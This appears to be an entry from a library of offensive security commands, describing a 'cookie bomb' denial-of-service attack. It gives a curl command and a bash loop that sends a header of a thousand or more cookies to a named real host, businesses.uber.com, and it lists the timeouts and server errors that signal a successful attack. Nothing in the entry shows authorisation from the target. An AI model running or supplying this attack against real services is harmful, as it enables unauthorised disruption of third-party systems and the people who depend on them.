---
data: 'curl -H "Cookie: $COOKIE_STRING" https://businesses.uber.com/ -v --max-time 30'
tags:
  - dos
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 8250bf1b-8c5f-4d57-acfa-32ad94c1b1b9
created_at: '2025-12-14T17:26:48.165Z'
updated_at: '2025-12-14T17:26:48.165Z'
verified: false
validated: true
submitted: true
---
# curl-cookie-bomb

## Command

```bash
curl -H "Cookie: $COOKIE_STRING" https://businesses.uber.com/ -v --max-time 30
```

## Description

This command sends an HTTP GET request to the target URL with a custom Cookie header containing an excessive number of cookie pairs (passed via $COOKIE_STRING variable), aiming to cause resource exhaustion on the server. Use it to test for uncontrolled cookie consumption vulnerabilities leading to DoS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Cookie: $COOKIE_STRING"` | Adds a custom Cookie header with the bombing payload; $COOKIE_STRING should be a long semicolon-separated list of cookies | Yes |
| `https://businesses.uber.com/` | Target URL endpoint | Yes |
| `-v` | Verbose output to show request/response details | No |
| `--max-time 30` | Maximum time in seconds for the request to complete, useful for detecting delays | No |

## Examples

### Basic Usage

```bash
COOKIE_STRING="bomb1=val1; bomb2=val2; bomb3=val3"
curl -H "Cookie: $COOKIE_STRING" https://example.com/ -v
```

### Advanced Usage

```bash
# Assuming $COOKIE_STRING has 1000+ cookies
generate_cookies() { for i in {1..1000}; do echo -n "cookie$i=val$i; "; done; }
COOKIE_STRING=$(generate_cookies)
curl -H "Cookie: $COOKIE_STRING" https://businesses.uber.com/ -v --max-time 60 --connect-timeout 10
```

## Expected Output

Verbose logs display the sent request including the large Cookie header, followed by a delayed response, timeout, or server error (e.g., 500 Internal Server Error) if resources are exhausted. Successful DoS indicators include response times exceeding 10-30 seconds or connection failures.

## Related

- [[Related Procedure: Cookie-Bombing-DoS]]
